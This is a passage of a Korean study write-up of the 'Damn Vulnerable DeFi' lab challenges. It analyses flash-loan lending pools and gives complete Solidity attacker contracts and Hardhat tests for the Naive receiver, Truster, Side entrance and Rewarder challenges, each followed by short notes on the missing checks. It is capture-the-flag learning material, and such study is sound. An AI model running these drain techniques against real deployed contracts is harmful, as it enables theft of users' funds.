+    await this.token.connect(attacker);
+    await this.token.transfer(
+      this.pool.address,
+      INITIAL_ATTACKER_TOKEN_BALANCE
+    );
+  });</code></pre><p id="098a1592-5f93-47d7-a365-c3d71570aa16" class="">flashloan 수행 시 poolBalance를 다시 업데이트할 필요 있음.</p><h1 id="07e01a0d-f5ed-4df3-8f1e-1f099ad89f96" class="">Challenge #2 - <strong>Naive receiver</strong></h1><h3 id="e5cf8e1d-34a3-494c-889c-f962ed3b0425" class="">설명</h3><p id="e74672e7-aa83-4061-a8ba-ce07a203d7d5" class=""><em>There’s a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.</em></p><p id="297dd657-a2cf-4c9e-aef7-ee2d1cd3b368" class=""><em>You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.</em></p><p id="3862f1ef-3413-495f-bb57-8740c95c4e9e" class=""><em>Drain all ETH funds from the user’s contract. Doing it in a single transaction is a big plus ;)</em></p><h3 id="97ec3001-adb9-43aa-abed-b8aaa928c62b" class="">목표</h3><p id="811f384c-96da-4e06-ba62-d237909609df" class="">유저 컨트랙트의 토큰을 다 터는게 목표. 공격 컨트랙트를 작성하여 해보기.</p><h3 id="9bc6af3d-8a9c-4412-a490-6107531140fb" class="">분석</h3><p id="04aac5ca-c378-4d10-8ce8-fcaeace001d5" class="">flashloan 함수는 receiver contract가 아니더라도 호출 가능.</p><p id="fb21b010-536c-4798-ac9e-6724a4e03571" class="">flashloan 함수는 0개의 토큰도 빌릴 수 있음.</p><h3 id="cffd687d-f8fd-4176-9cd2-f09439f0bb39" class="">공격</h3><p id="2144389c-35ff-49e6-8c9f-80c5808ac02a" class="">receiver로 하여금 0개의 토큰을 빌리도록 flashloan을 반복 이행하여 수수료로 다 털어 잔고를 0으로 만들기.</p><p id="7e6f8996-98d9-4225-b30d-21878223f98f" class="">테스트 스크립트에서 flashloan을 단순 반복 호출할 수 있으나 컨트랙트로 만들기를 권장했으니 해보기.</p><pre id="a73cce3a-cf7d-4341-8f7c-4ad51306ac7c" class="code code-wrap"><code>// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+interface INaiveReceiverLenderPool {
+    function fixedFee() external pure returns (uint256);
+
+    function flashLoan(address borrower, uint256 borrowAmount) external;
+}
+
+contract NaiveReceiverAttacker {
+    function attack(INaiveReceiverLenderPool pool, address payable receiver)
+        public
+    {
+        uint256 FIXED_FEE = pool.fixedFee();
+        while (receiver.balance &gt;= FIXED_FEE) {
+            pool.flashLoan(receiver, 0);
+        }
+    }
+}</code></pre><pre id="972d08fa-d2ac-472b-8d41-a202af209339" class="code code-wrap"><code>it(&quot;Exploit&quot;, async function () {
+    /** CODE YOUR EXPLOIT HERE */
+    const NaiveAttacker = await ethers.getContractFactory(
+      &quot;NaiveReceiverAttacker&quot;,
+      attacker
+    );
+    this.attackerContract = await NaiveAttacker.deploy();
+    await this.attackerContract.attack(
+      this.pool.address,
+      this.receiver.address
+    );
+  });</code></pre><p id="48f7a6b8-e2d7-4331-83ab-1dde19b6bd4f" class="">receiver contract의 owner체크 필요</p><p id="e7c73e07-68c7-4d67-80ed-b04b5adb503f" class="">flashloan으로 빌릴 토큰이 소진하는 토큰(수수료) 보다 같거나 많은 지 체크</p><p id="fa2dc599-e368-4ef5-9f71-116752fc4411" class="">
+</p><h1 id="955120f9-2ac9-4eed-85c8-49fd01e6f807" class="">Challenge #3 - Truster</h1><h3 id="bc6ffcfb-e28c-40af-861e-31b0ffb25ad9" class="">설명</h3><p id="e469f63e-cabe-4934-88c9-f0e06ce5ba40" class=""><em>More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.</em></p><p id="0376eed2-2d5b-4018-8a9f-d1dbf7248da0" class=""><em>Currently the pool has 1 million DVT tokens in balance. And you have nothing.</em></p><p id="81553099-5f41-4fc9-95cf-b1201bbb0b97" class=""><em>But don’t worry, you might be able to take them all from the pool. In a single transaction.</em></p><h3 id="6ce94224-c8ea-4f8b-8edc-ac8470b8dac2" class="">목표</h3><p id="ba8b4baf-5c88-474d-8d18-517850b4f1c5" class="">attacker가 pool의 balance 다 가져가기</p><h3 id="272b2a72-563a-4b69-845a-16e4bf901be5" class="">분석</h3><p id="3e2a3106-b285-4553-867d-c0d5d6553155" class="">flashloan에서 0개 토큰 체크 안함.</p><p id="10e80148-f2bd-454a-b94e-4a63cf1151bf" class="">flashloan 실행 주체가 누구인지 확인 안함.</p><p id="c1922acd-3b97-4508-9453-3de8a5dad09e" class="">target에 functionCall 가능.</p><h3 id="434112ca-ead4-469e-83da-23f16d634d9c" class="">공격</h3><p id="cfeff135-5c86-422d-93ff-8d219f811350" class="">공격 contract에서 0개 토큰을 빌리는 flashloan 수행.</p><p id="becff1ce-a510-4b47-a039-c98aa319d9ea" class="">이 때 functionCall은 approve 함수를 수행하여 pool contract의 권한 획득!</p><p id="9d0a2648-66a4-417c-9bd4-4e53be34dbea" class="">그 다음은 마음대로!</p><pre id="c9c872d8-0c42-4f48-9832-b0d775bd0c07" class="code code-wrap"><code>// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;
+import &quot;../truster/TrusterLenderPool.sol&quot;;
+
+contract TrusterLenderAttacker {
+    IERC20 immutable dvt;
+    TrusterLenderPool immutable pool;
+    address immutable owner;
+    uint256 immutable poolToken;
+
+    constructor(
+        address _dvtAddress,
+        address _poolAddr,
+        uint256 _poolToken
+    ) {
+        dvt = IERC20(_dvtAddress);
+        pool = TrusterLenderPool(_poolAddr);
+        owner = msg.sender;
+        poolToken = _poolToken;
+    }
+
+    function drain() external {
+        require(msg.sender == owner);
+
+        bytes memory data = abi.encodeWithSignature(
+            &quot;approve(address,uint256)&quot;,
+            address(this),
+            poolToken
+        );
+
+        pool.flashLoan(0, owner, address(dvt), data);
+        dvt.transferFrom(address(pool), owner, dvt.balanceOf(address(pool)));
+    }
+}</code></pre><pre id="5f9a64ca-0ed5-4ae4-81a6-bf7d88088fcf" class="code code-wrap"><code>it(&quot;Exploit&quot;, async function () {
+    /** CODE YOUR EXPLOIT HERE  */
+    const TrusterAttacker = await ethers.getContractFactory(
+      &quot;TrusterLenderAttacker&quot;,
+      attacker
+    );
+    this.attackContract = await TrusterAttacker.deploy(
+      this.token.address,
+      this.pool.address,
+      TOKENS_IN_POOL
+    );
+    await this.attackContract.connect(attacker).drain();
+  });</code></pre><p id="e4a664b0-6d5b-43be-8ca6-b8ac940f0bca" class="">functionCall 은 강력한 함수. 다른 contract를 call할 떄 권한 인증이 중요.</p><h1 id="bacf96e4-03ae-49b9-8ee2-d6951fc3157f" class="">Challenge #4 - Side entrance</h1><h3 id="e1ae8a06-f191-4a1d-bbf7-77840a18b114" class="">설명</h3><p id="9ae826c2-4e58-4bdd-b33b-dfc94ad6015e" class="">A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.</p><p id="76aafb0e-4bc0-4c94-8d39-f50656f5ed4e" class="">This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.</p><p id="354c7da8-052f-47d9-b033-a33c18aabb9c" class="">You must take all ETH from the lending pool.</p><h3 id="042e7320-c8f0-4b19-9aa3-a75b988a4ba4" class="">목표</h3><p id="2e40ca95-cff4-4990-85a6-60bd0474552f" class="">pool balance 다 털기. attacker balance는 초기 값보다 높으면 됨.</p><h3 id="0c496bc2-17bd-4b42-9b8d-99544381731a" class="">분석</h3><p id="667836c3-f869-4d04-a5ac-b34eb64a9cdb" class="">contract에서 deposit과 withdraw는 mapping된 변수를 사용하지만 flashloan 함수는 address에서 직접 가져옴.</p><p id="e0d43fff-230b-4605-8300-775747a50b5b" class="">flashloan 에는 execute가 있음.</p><h3 id="30865389-8b8a-47d9-b31b-262ee7a94e6e" class="">공격</h3><p id="cdec463b-d140-472d-bd4c-5cdd7527185c" class="">공격 컨트랙트에서 flashloan을 호출하고 execute를 통해 deposit 함수를 실행하게 함. </p><p id="f505b874-b976-4529-8335-b929d28e1147" class="">deposit된 balance는 공격자 컨트랙트가 가짐. balances[msg.sender]</p><p id="aece29c9-3ea2-47d2-9888-b569a5764a34" class="">deposit은 mapping의 balance로 업데이트하고 있어 flashloan이 확인 못함.</p><p id="5cde1092-a93a-4185-b6fa-481f31d5610b" class="">그 다음은 그냥 가져가면 됨.</p><p id="bf8250cc-db54-494e-8afe-03ec4e35ce5f" class="">withdraw로 pool의 balance를 가져가고 transfer로 공격자에게 전송.</p><p id="17a9e2c6-b193-42d4-b165-124ccea80e05" class="">
+</p><pre id="85a14608-de0e-4c1b-8a3e-185381867e9a" class="code code-wrap"><code>// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface ISideEntranceLenderPool {
+    function deposit() external payable;
+
+    function withdraw() external;
+
+    function flashLoan(uint256 amount) external;
+}
+
+interface IFlashLoanEtherReceiver {
+    function execute() external payable;
+}
+
+contract SideEntranceAttacker is IFlashLoanEtherReceiver {
+    ISideEntranceLenderPool immutable pool;
+    uint immutable etherInPool;
+    address payable immutable attacker = payable(msg.sender);
+
+    constructor(address _pool, uint _etherInPool) {
+        pool = ISideEntranceLenderPool(_pool);
+        etherInPool = _etherInPool;
+    }
+
+    function pwn() external {
+        pool.flashLoan(etherInPool);
+        pool.withdraw();
+        attacker.transfer(address(this).balance);
+    }
+
+    function execute() external payable override {
+        pool.deposit{value: msg.value}();
+    }
+
+    receive() external payable {}
+}</code></pre><pre id="54e26eba-c7d4-449d-bef1-9bd6cf595264" class="code code-wrap"><code>it(&quot;Exploit&quot;, async function () {
+    /** CODE YOUR EXPLOIT HERE */
+    const ExploitFactory = await ethers.getContractFactory(
+      &quot;SideEntranceAttacker&quot;,
+      attacker
+    );
+    // Run Exploit constructor.
+    const exploit = await ExploitFactory.deploy(
+      this.pool.address,
+      ETHER_IN_POOL
+    );
+    await exploit.pwn();
+  });</code></pre><p id="96d873fd-c74a-42f6-b493-0988f10fd7eb" class="">특정의 값을 비교할 때, state variable을 사용할 것이면 어디서 값이 변할 수 있는지 추적하고 의도하지 않은 루트는 막아야 함. 아니면 비교 시점 직전에 항상 값을 새로 읽어 비교.</p><p id="fcfcc8db-ccb6-4991-b6f6-fc7c50ad0e8d" class="">withdraw() 실행 시에도 owner 확인이 필요.</p><h1 id="190de3c6-c44d-42be-9b74-a5dac522d31c" class="">Challenge #5 - Rewarder</h1><h3 id="e271378e-77b1-4f8e-87a2-d11ba8c12cb8" class="">설명</h3><p id="dc32c50f-f814-40ae-b681-35ca5f5a6ae6" class="">There&#x27;s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.</p><p id="6a07463d-29e9-42df-bf16-c038c4b0687e" class="">Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!</p><p id="fa802200-b203-4f54-92a1-b1d5a71324dd" class="">You don&#x27;t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.</p><p id="0d6e2237-1cc2-401b-81df-d29e1a9ff8d5" class="">Oh, by the way, rumours say a new pool has just landed on mainnet. Isn&#x27;t it offering DVT tokens in flash loans?</p><h3 id="ea9511aa-c5b1-4d24-ba24-1c6613dd622e" class="">목표</h3><p id="4e624428-977a-44bc-8861-3369299213ee" class="">3라운드 시점에 4명의 참가자는 0.01 토큰보다 낮은 리워드를 받아야 함.</p><p id="8b69b4f9-0332-45d8-9432-bded7c9eb7e0" class="">총 공급량은 100 토큰보다 커야 함.</p><p id="f0e04906-a0b9-46fe-b6ac-995c2a2a12f6" class="">attacker의 리워드 토큰은 100 근방</p><p id="d3e5ca02-44d5-449e-966b-43e0778cb82b" class="">attacker의 유동성 토큰은 0개</p><h3 id="c83429b1-f89a-481a-9113-f40cda42dcc0" class="">분석</h3><p id="69f9d71b-3f89-4d79-9dcb-6ff0d23b7162" class="">기존 4명은 각각 100개 토큰씩 예치하여 총 400개</p><p id="acb3fc7c-7a07-499e-aced-6058666a1590" class="">리워드는 총 예치량 대비 개인의 예치량의 백분율로 정해짐.</p><p id="6abb3c10-bd92-4df0-9ec3-1b936708929e" class="">100만 숫자에 400은 오차 수준.</p><h3 id="d13daa88-013f-49e6-8e6c-a3538274d247" class="">공격</h3><p id="7442d7f1-126c-485c-bdf7-29fea3f73f18" class="">flashloan으로 100만개 토큰을 빌려서 reward pool에 예치. </p><p id="815f4064-53c6-404a-953f-267b72fe4aff" class="">리워드 받아서 빌린 토큰 플래시론에 반환하고 리워드는 attacker에 전송하면 끝</p><p id="38d9b6b4-159a-48ff-a24c-11b953880a5a" class="">
+</p><pre id="38788e52-4af3-4e8b-851e-35d4cb9ee72d" class="code code-wrap"><code>// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import &quot;../the-rewarder/RewardToken.sol&quot;;
+import &quot;../the-rewarder/TheRewarderPool.sol&quot;;
+import &quot;../the-rewarder/FlashLoanerPool.sol&quot;;
+
+contract RewarderAttacker {
+    FlashLoanerPool flashLoanPool;
+    TheRewarderPool rewarderPool;
+    DamnValuableToken liquidityToken;
+    RewardToken rewardToken;
+
+    address owner;
+
+    constructor(
+        DamnValuableToken _liquidityToken,
+        FlashLoanerPool _flashLoanPool,
+        TheRewarderPool _rewarderPool,
+        RewardToken _rewardToken
+    ) {
+        owner = msg.sender;
+        liquidityToken = _liquidityToken;
+        flashLoanPool = _flashLoanPool;
+        rewarderPool = _rewarderPool;
+        rewardToken = _rewardToken;
+    }
+
+    function receiveFlashLoan(uint256 borrowAmount) external {
+        require(msg.sender == address(flashLoanPool), &quot;only pool&quot;);
+
+        liquidityToken.approve(address(rewarderPool), borrowAmount);
+
+        rewarderPool.deposit(borrowAmount);
+
+        rewarderPool.withdraw(borrowAmount);
+
+        bool payedBorrow = liquidityToken.transfer(
+            address(flashLoanPool),
+            borrowAmount
+        );
+        require(payedBorrow, &quot;Borrow not payed back&quot;);
+
+        uint256 rewardBalance = rewardToken.balanceOf(address(this));
+        bool rewardSent = rewardToken.transfer(owner, rewardBalance);
+
+        require(rewardSent, &quot;Reward not sent back to the contract&#x27;s owner&quot;);
+    }
+
+    function attack() external {
+        require(msg.sender == owner, &quot;only owner&quot;);
+
+        uint256 dvtPoolBalance = liquidityToken.balanceOf(
+            address(flashLoanPool)
+        );
+        flashLoanPool.flashLoan(dvtPoolBalance);
+    }
+}</code></pre><pre id="d809878d-3986-4c40-9d39-f1a7aa767a63" class="code code-wrap"><code>/** CODE YOUR EXPLOIT HERE */
+    await ethers.provider.send(&quot;evm_increaseTime&quot;, [5 * 24 * 60 * 60]);
+    const RewarderAttacker = await ethers.getContractFactory(
+      &quot;RewarderAttacker&quot;,
+      attacker
+    );
+    this.rewarderAttacker = await RewarderAttacker.deploy(
+      this.liquidityToken.address,
+      this.flashLoanPool.address,
+      this.rewarderPool.address,
+      this.rewardToken.address
+    );
+    await this.rewarderAttacker.connect(attacker).attack();</code></pre><p id="033f9198-e57a-419d-b56f-2bb7fff188de" class="">유동성 풀이 작아서 벌어지는 문제. 기능은 정상적으로 동작한 것으로 보이나. 너무 극단적. 최소 보상치를 보장하거나 지나치게 큰 portion을 가지게 될 경우. log 등 특정의 capping method가 필요해 보임.</p><h1 id="eb074a8d-f8d1-41bf-a4de-ab43a7626e38" class="">Challenge #6 - Selfie</h1><h3 id="49d9f1ee-1980-441c-9539-46a570ae2c56" class="">설명</h3><p id="0c48e0ef-0aa9-49bf-8615-99be0d83db74" class="">A new cool lending pool has launched! It&#x27;s now offering flash loans of DVT tokens.</p><p id="7ab30ee6-f83b-4d6c-ad2d-24cb5a472bcd" class="">Wow, and it even includes a really fancy governance mechanism to control it.</p><p id="25575831-c738-4348-813e-c45dff63419a" class="">What could go wrong, right ?</p><p id="ac10f709-7a88-43aa-9bb1-2546538e42ed" class="">You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.</p><h3 id="a8b44ad4-c045-4bc6-b32d-dfb18bd5dc92" class="">목표</h3><p id="40d1bead-ef70-456a-8621-716c67124e26" class="">pool의 token 다 내꺼하기.</p><h3 id="d9e62e87-67c8-4659-9995-7178d9ccd501" class="">분석</h3><p id="d2ebce2c-4145-4bde-9aa0-195dd37ed008" class="">거버넌스와 스냅샷 개념이 추가 됨.</p><p id="30b9f800-c7d1-4634-93f3-e41f3cb03c08" class="">
+</p><p id="611ed3da-38cb-40ab-a2c9-474d206906a9" class="">
+</p><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="78a4edfa-af70-49db-9ce3-0fa52d04faab"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">To be continue…</div></figure><p id="12b62c74-50f7-4b51-aada-a0233e4ece34" class="">다 재밌어보이는데 실력이 부족한게 결정적이네요.. 정진하겠습니다ㅠ(코어쪽을 지향하지만 다양한 방면으로 다 잘 알고 있어야 한다고 생각해서 참여합니다!)</p><p id="925aa0b7-6928-4d4d-acb9-4f27ca4786a7" class="">
+</p><figure id="02802920-110a-4fc9-abc1-cc49f3888f96"><a href="https://bears-team.github.io/posts/" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Posts by Year</div><div class="bookmark-description">BEARS means Blacksmith Enhanced Armor for Robust Smart-contract. The purpose of BEARS team is to analyze and learn the old and contemporary vulnerabilities of smart-contract as quickly as possible. And our team will research various methods for discovering the vulnerabilities of smart-contract.</div></div><div class="bookmark-href">https://bears-team.github.io/posts/</div></div></a></figure></div></article></body></html>
